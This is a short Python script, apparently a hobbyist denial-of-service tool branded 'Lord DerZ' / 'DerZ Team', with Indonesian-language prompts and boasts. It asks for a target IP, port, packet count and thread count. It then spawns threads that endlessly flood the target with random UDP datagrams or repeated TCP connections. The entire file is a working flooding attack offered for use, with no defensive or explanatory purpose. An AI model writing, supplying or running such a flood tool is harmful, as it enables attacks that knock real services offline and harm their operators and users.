#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > Lord DerZ nih dek!! < - - ")
print       (" - - > DerZ Nih Dek!!!! < - - ")
print       (" - - > Join DerZ Team <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > DerZ Nih dek  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  DERZ TEAM KATA ILHAM  < - - ")
    
ip = str(input("  IP/HOST:"))
port = int(input(" PORT:"))
choice = str(input(" SERIUS NIHH MAU NYERANG HA ? (y/n):"))
times = int(input(" PAKET NYA MAU BERAPA NIEH:"))
threads = int(input(" MAU BERAPA PELOR NIEH:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Paket From Lord DerZ!!! ")
		except:
			print("[!] Down Kontol!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Paket From Lord DerZ!!! ")
		except:
			s.close()
			print("[*] Down Kontol!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
